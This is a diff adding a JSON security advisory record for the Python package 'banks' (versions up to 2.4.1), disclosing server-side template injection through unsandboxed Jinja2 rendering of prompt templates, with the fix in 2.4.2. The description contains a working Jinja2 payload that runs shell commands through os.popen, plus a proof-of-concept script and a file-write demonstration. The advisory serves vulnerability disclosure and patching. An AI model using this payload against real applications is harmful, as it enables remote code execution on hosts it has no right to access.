@@ -1,0 +1,53 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-05-08T20:36:25Z",
+  "Package": {
+    "Ecosystem": "PIP",
+    "Name": "banks"
+  },
+  "Advisory": {
+    "DatabaseId": 354311,
+    "Id": "GSA_kwCzR0hTQS1ncGhoLTlxM2gtamdwcM4ABWgH",
+    "GhsaId": "GHSA-gphh-9q3h-jgpp",
+    "References": [
+      {
+        "Url": "https://github.com/masci/banks/security/advisories/GHSA-gphh-9q3h-jgpp"
+      },
+      {
+        "Url": "https://github.com/masci/banks/pull/74"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-gphh-9q3h-jgpp"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-gphh-9q3h-jgpp"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-44209"
+      }
+    ],
+    "Description": "## Summary\n\n`banks \u003c= 2.4.1` uses `jinja2.Environment()` (unsandboxed) to render prompt templates. Applications that pass user-supplied strings as the template argument to `Prompt()` are vulnerable to Server-Side Template Injection (SSTI), which can lead to Remote Code Execution (RCE) on the host system.\n\nThis is a vulnerability in how `banks` initializes its Jinja2 environment — not in Jinja2 itself.\n\n## Vulnerable Code\n\n`src/banks/env.py` — the global Jinja2 environment is created without sandboxing:\n\n```python\nenv = Environment(\n    autoescape=select_autoescape(enabled_extensions=(\"html\", \"xml\"), default_for_string=False),\n    ...\n)\n```\n\n## Attack Scenario\n\nAn application that stores prompt templates in a database, accepts them via an API, or loads them from a user-supplied config file and passes them to `Prompt()` is vulnerable. For example:\n\n```python\n# User-controlled input reaches Prompt()\nuser_input = \"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}\"\np = Prompt(user_input)\np.text()  # Executes arbitrary command on the host\n```\n\n## Proof of Concept\n\n**Setup:**\n```bash\npip install banks==2.4.1\n```\n\n**PoC script:**\n```python\nfrom banks import Prompt\n\npayload = \"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}\"\np = Prompt(payload)\nresult = p.text()\nprint(f\"[+] Output: {result}\")\n```\n\n**Confirmed output:**\n```\n[+] Output: uid=1000(ak) gid=1000(ak) groups=1000(ak),27(sudo),...\n\ntext\n\n**File-write proof:**\n```python\nfrom banks import Prompt\n\np = Prompt(\"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo POC \u003e /tmp/rce_banks_exec').read() }}\")\np.text()\n```\n```bash\nls -l /tmp/rce_banks_exec\n# -rw-rw-r-- 1 ak ak 4 Apr 27 15:36 /tmp/rce_banks_exec\n```\n\n## Impact\n\nApplications that allow end-users to supply or customize prompt templates are at risk of full Remote Code Execution, including arbitrary command execution, data exfiltration, and server compromise.\n\n## Fix\n\nFixed in `banks 2.4.2` (PR #74) by switching to `jinja2.sandbox.SandboxedEnvironment`, which blocks the dunder attribute traversal chain this exploit relies on.\n\nDevelopers on `banks \u003c= 2.4.1` should upgrade to `2.4.2` and avoid passing untrusted user input as the template argument to `Prompt()`.\n\n## Resources\n- Fix: https://github.com/masci/banks/pull/74\n- CVE-2024-41950 (Haystack — identical root cause, CVSS 7.5)\n- CVE-2025-25362 (spacy-llm — identical root cause)\n- CWE-1336: Improper Neutralization of Special Elements in a Template Engine",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-08T20:36:22Z",
+    "Severity": "HIGH",
+    "Summary": "banks has Critical Remote Code Execution (RCE) via Jinja2 SSTI",
+    "UpdatedAt": "2026-05-08T20:36:25Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.5,
+      "VectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.4.2"
+      },
+      "VulnerableVersionRange": "\u003c= 2.4.1"
+    }
+  ]
+}
